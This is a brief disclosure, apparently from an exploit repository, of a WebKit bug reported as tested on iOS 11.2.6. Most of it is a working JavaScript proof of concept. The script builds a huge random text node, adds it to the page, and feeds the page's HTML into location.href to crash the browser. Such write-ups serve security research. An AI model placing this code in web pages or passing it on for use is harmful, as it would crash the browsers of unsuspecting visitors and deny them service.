# WebKit jump to address 0 via DOM nodes + location.href

WebKit has a new vulnerability; and it has been tested on the iPhone 6S (iOS 11.2.6). 

It works by appending a large p tag to the DOM, then flowing the data into location.href. 

PoC (@iHateRa1n):

```javascript
function rndchr(){
    return String.fromCharCode(Math.floor(Math.random()*255));
};
n=1024;
k=document.createElement("p");
l=0;
kl="";
while(l<n){
    kl=kl+rndchr();
    l++;
}
s=document.createTextNode((kl).repeat(16384));
k.appendChild(s);
document.body.appendChild(k);
location.href=document.body.innerHTML;
```

discovered and exploited by @iHateRa1n. 

PS-2018-8842
